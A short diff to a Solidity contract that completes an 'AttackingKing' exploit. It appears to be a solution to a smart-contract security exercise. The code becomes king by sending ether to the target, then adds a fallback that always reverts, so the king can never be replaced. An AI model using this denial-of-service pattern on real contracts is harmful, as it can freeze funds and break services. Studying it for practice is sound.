@@ -11,6 +11,12 @@ contract AttackingKing {
     }
 
     function hackContract() external {
-        // Code me!
+        (bool success,) = contractAddress.call{value: 1 ether}(""); // Set this contract as the new king.
+        require(success, "hack did not work...");
+    }
+
+    fallback() external payable {
+        // Catch King.transfer and revert the tx.
+        revert("you cannot be the king");
     }
 }
